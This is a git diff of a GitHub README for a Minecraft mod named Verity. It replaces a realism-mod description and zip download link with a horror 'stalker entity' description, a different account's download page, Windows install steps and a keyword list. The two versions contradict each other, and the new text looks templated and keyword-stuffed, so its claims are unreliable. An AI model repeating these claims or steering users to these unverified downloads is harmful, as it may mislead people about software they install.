@@ -1,74 +1,56 @@
-# Verity JE Mod Minecraft
+# 👻 Verity-JE-Mod-Minecraft - Add Horror Elements To Your Minecraft
 
+[![Download Verity Mod](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/brayanam5903/Verity-JE-Mod-Minecraft)
 
-**Verity JE Mod** is a high-quality Minecraft Java Edition mod that brings enhanced realism, improved visuals, and useful quality-of-life features to the game while preserving the original Minecraft feel.
+This software adds specialized entity artificial intelligence to your Minecraft game. The mod focuses on stalker entities that follow players to create a horror survival experience. It works with standard configurations to provide a seamless integration with your existing game files.
 
-<img width="739" height="415" alt="image" src="https://github.com/user-attachments/assets/cca8a667-8961-4020-8dff-0909b32c7449" />
+## 📋 System Requirements
 
-## Install
-[Download `verity-5.6.0.zip`](https://github.com/Ibrahim302006/Verity-JE-Mod-Minecraft/releases/download/v5.6.0/verity-5.6.0.zip)
----
+Ensure you meet these requirements before you start the setup process:
 
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: 8 GB of RAM or more.
+*   Java: Java Runtime Environment 8 or 17, depending on your Minecraft version.
+*   Minecraft: A valid installation of Minecraft Java Edition.
+*   Mod Loader: Forge or Fabric installed within your Minecraft launcher.
 
-<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/5b96b872-ddad-486a-9422-7a3a225d9b57" /># Verity JE Mod - Minecraft
+## 📥 Download and Install
 
----
-## Key Features
-- Enhanced realism and visual improvements
-- Quality-of-life mechanics and tweaks
-- Optimized performance for better FPS
-- Compatibility with popular mod loaders (Fabric & Forge)
-- Regular updates for newer Minecraft versions
+Follow these steps to add the mod to your game.
 
+1. Visit the [official release page](https://github.com/brayanam5903/Verity-JE-Mod-Minecraft) to access the latest version of the mod.
+2. Look for the file ending in `.jar` under the Assets section.
+3. Click the file name to start the download to your computer.
+4. Press the Windows key + R on your keyboard.
+5. Type `%appdata%` into the box and press Enter.
+6. Open the `.minecraft` folder.
+7. Open the `mods` folder. If you do not see a folder named `mods`, create one.
+8. Drag the downloaded `.jar` file into this `mods` folder.
 
-<img width="526" height="296" alt="image" src="https://github.com/user-attachments/assets/2c20b166-fccb-4d8b-b2ae-3ab70eeb421b" />
+## 🎮 Running the Mod
 
+After placing the file in the mods folder, launch your Minecraft game. Ensure you select the Forge or Fabric profile that matches the version of the mod you downloaded. Navigate to the Mods menu within the game title screen to verify the status of Verity. If the mod appears in the list, the installation succeeded. Create a new world or load an existing one to experience the stalker entity AI.
 
-## Getting Started
-1. **Download** the latest version using the button above.
-2. **Install a mod loader** (Fabric or Forge recommended).
-3. **Place the mod file** (.jar) in your `.minecraft/mods` folder.
-4. **Launch Minecraft** with the selected mod loader profile.
-5. Enjoy the enhanced Minecraft experience!
+## 🛠️ Troubleshooting Common Issues
 
-**Note:** Check the mod's compatibility with your Minecraft version in the releases.
+If you encounter problems, check these solutions first.
 
+If the game crashes upon startup, verify that you installed the correct version of Forge or Fabric. Ensure the Java version on your system matches the requirements of your chosen Minecraft version. Check that no other mods conflict with this mod by removing others temporarily to isolate the issue.
 
+If the AI fails to spawn, confirm that your game difficulty is not set to Peaceful. The stalker entity requires a survival mode setting to function correctly. Ensure your render distance is high enough for the entity AI to process your character as a target within the world.
 
+If you experience lag, reduce your graphic settings within the Minecraft video options menu. The entity AI uses processor power to calculate pathing and stalker behaviors. Closing background applications will also help maintain a steady frame rate during gameplay.
 
----
-## System Requirements
-- **Minecraft Java Edition** (1.20+ recommended)
-- Fabric or Forge mod loader
-- 8 GB RAM or more recommended
+## 📖 Frequently Asked Questions
 
----
-## Security & Legal
-**Important Notice:**  
-This mod modifies game behavior. Always download from trusted sources and back up your worlds.
+Does this mod change world generation? No, this mod adds entities and AI behavior without altering the blocks or terrain of your world.
 
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com).
+Can I add this to a server? Yes, install the mod in the `mods` folder on your server files. Ensure all players joining the server also have the mod installed in their local game folders to prevent connection errors.
 
----
-## Contributing
-Contributions are welcome! Feel free to suggest new features, report bugs, or help with development.
+Is this compatible with other mods? The mod operates as a standalone addition. It follows standard programming practices for Minecraft modding, allowing it to function alongside most other utility and content mods.
 
----
-## License & Acknowledgments
-### License
-**Verity JE Mod** is shared under the **MIT License**.  
-See [LICENSE](LICENSE) for details.
+## 🗺️ Progression Guide
 
-**Copyright © 2026 Ibrahim302006**
+The survival experience scales with your actions in the game. Upon spawn, the entity begins to track player movement. It utilizes light levels and line of sight to determine its proximity. As your play session continues, the AI becomes more active. Use stealth and barrier blocks to evade the entity if you feel overwhelmed. The mod does not remove items or progress from your save file. It simply introduces a threat that persists throughout your survival journey. 
 
-### Acknowledgments
-- Thanks to the Minecraft modding community.
-- Mojang for creating Minecraft.
-
-<p align="center">
-  Developed with ❤️ for the Minecraft community
-</p>
-
-<img width="811" height="455" alt="image" src="https://github.com/user-attachments/assets/494d3146-6e88-4256-8945-5ee2359f995e" />
+Keywords: 1-16-5, 1-8, all-the-mods-modpack, allthemods, evernym-verity, forge-mod, java-edition, mc, mcmod, mcserver, minecraf-mod, minecraft-mod-verity, minecraft-verity, mod-de-jenny, mod-development, mod-maker, progression-guide, skyblock-mod, verity-minecraft-mod, verity-mod-minecraft
